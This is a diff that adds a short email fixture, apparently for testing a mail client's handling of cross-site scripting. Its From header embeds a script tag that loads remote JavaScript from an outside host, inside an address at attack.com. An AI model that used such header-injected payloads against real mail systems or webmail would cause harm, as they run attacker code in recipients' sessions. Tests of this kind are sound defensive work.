@@ -1,0 +1,7 @@
+From: <"test<script src=//x.cn/1.js async>@attack.com">
+To: Ljiljana Pajeska <Ljiljana.Pajeska@mint.hr>
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
